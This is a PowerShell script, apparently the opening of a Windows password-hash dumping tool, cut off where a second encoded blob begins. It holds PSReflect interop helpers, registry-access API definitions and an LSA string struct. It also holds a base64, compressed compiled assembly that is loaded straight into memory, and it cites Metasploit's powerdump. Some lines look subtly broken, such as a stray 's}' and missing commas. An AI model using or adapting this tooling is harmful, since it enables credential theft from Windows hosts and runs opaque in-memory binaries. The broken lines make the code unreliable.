#region PSReflect
function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($Null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type
{
<#
    .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func

    .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

    .PARAMETER DllName

        The name of the DLL.

    .PARAMETER FunctionName

        The name of the target function.

    .PARAMETER ReturnType

        The return type of the function.

    .PARAMETER ParameterTypes

        The function parameters.

    .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

    .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

    .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

    .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}

function psenum
{
<#
    .SYNOPSIS

        Creates an in-memory enumeration for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION

        The 'psenum' function facilitates the creation of enums entirely in
        memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

        The in-memory module that will host the enum. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the enum.

    .PARAMETER Type

        The type of each enum element.

    .PARAMETER EnumElements

        A hashtable of enum elements.

    .PARAMETER Bitfield

        Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
            UNKNOWN =                  0
            NATIVE =                   1 # Image doesn't require a subsystem.
            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
            EFI_APPLICATION =          10
            EFI_BOOT_SERVICE_DRIVER =  11
            EFI_RUNTIME_DRIVER =       12
            EFI_ROM =                  13
            XBOX =                     14
            WINDOWS_BOOT_APPLICATION = 16
        }

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}

function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
 
.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.PARAMETER CharSet

Dictates which character set marshaled strings should use.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

$Module = New-InMemoryModule -ModuleName Win32

$LSA_UNICODE_STRING = struct $Module LSA_UNICODE_STRING @{
    Length        = field 0 UInt16
    MaximumLength = field 1 UInt16
    Buffer        = field 2 IntPtr
}

$FunctionDefinitions = @(
(func advapi32 RegConnectRegistry([UInt32]) @(
        [String],
        [Int32],
        [IntPtr].MakeByRefType()
    )-EntryPoint RegConnectRegistry -SetLastError),

(func advapi32 RegOpenKeyEx([UInt32]) @(
        [IntPtr],
        [String],
        [Int],
        [Int],
        [IntPtr].MakeByRefType()
    )-EntryPoint RegOpenKeyEx -SetLastError),

(func advapi32 RegQueryInfoKey([UInt32]) @(
        [IntPtr],
        [System.Text.StringBuilder]
        [Int].MakeByRefType(),
        [Int],
        [IntPtr].MakeByRefType(),
        [IntPtr].MakeByRefType(),
        [IntPtr].MakeByRefType(),
        [IntPtr].MakeByRefType(),
        [IntPtr].MakeByRefType(),
        [IntPtr].MakeByRefType(),
        [IntPtr].MakeByRefType(),
        [IntPtr]
    )-EntryPoint RegQueryInfoKey -SetLastError)

(func advapi32 RegQueryValueEx([UInt32]) @(
        [IntPtr],              # _In_        HKEY    hKey,
        [String],              # _In_opt_    LPCTSTR lpValueName,
        [Int],                 # _Reserved_  LPDWORD lpReserved,
        [Int].MakeByRefType(), # _Out_opt_   LPDWORD lpType,
        [Byte[]],              # _Out_opt_   LPBYTE  lpData,
        [Int].MakeByRefType()  # _Inout_opt_ LPDWORD lpcbData
    )-EntryPoint RegQueryValueEx -SetLastError)
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'
$Advapi32 = $Types['advapi32']


# compiled MD4 assembly adapted from https://github.com/ShokoAnime/ShokoServer/blob/master/Shoko.Server/FileHelper/MD4Managed.cs
$EncodedCompressedFile = @'
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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](6656)
$DeflatedStream.Read($UncompressedFileBytes, 0, 6656) | Out-Null
$Null = [Reflection.Assembly]::Load($UncompressedFileBytes)


# compiled bitshift assembly from https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1
$EncodedCompressedFile = @'
